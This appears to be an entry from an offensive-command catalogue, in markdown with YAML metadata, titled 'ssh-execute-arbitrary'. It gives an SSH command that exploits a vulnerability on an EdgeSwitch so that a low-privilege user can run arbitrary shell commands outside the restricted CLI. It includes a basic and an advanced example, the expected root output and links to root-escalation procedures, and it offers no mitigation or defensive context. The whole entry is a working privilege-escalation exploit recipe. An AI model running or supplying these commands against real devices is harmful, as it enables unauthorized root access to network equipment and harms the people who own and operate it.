---
data: ssh privilege0_user@192.168.1.1 '/bin/sh -c "id"'
tags:
  - ssh
  - shell-execution
  - rce
type: command
output: null
executor: bash
platforms:
  - Embedded Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:35.644Z'
id: 11e4093b-45c5-43e2-b70e-d5650fd110fe
verified: false
validated: true
submitted: true
---
# ssh-execute-arbitrary

## Command

```bash
ssh privilege0_user@192.168.1.1 '/bin/sh -c "id"'
```

## Description

Executes an arbitrary shell command remotely via SSH on the EdgeSwitch, exploiting the vulnerability to run system commands outside CLI restrictions.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| privilege0_user | Authenticated low-privilege user | Yes |
| 192.168.1.1 | Target IP | Yes |
| '/bin/sh -c "id"' | Shell command to execute (e.g., id for privilege check) | Yes |

## Examples

### Basic Usage

```bash
ssh privilege0_user@192.168.1.1 '/bin/sh -c "id"'
```

### Advanced Usage

```bash
ssh privilege0_user@192.168.1.1 '/bin/sh -c "whoami; ls /root"'
```

## Expected Output

"uid=0(root) gid=0(root)" indicating successful escalation, or privilege-0 details if restricted.

## Related

- [[commands/ssh-root-shell]]
- [[procedures/Execute-Arbitrary-Shell-Commands-via-SSH-for-Root-Escalation]]
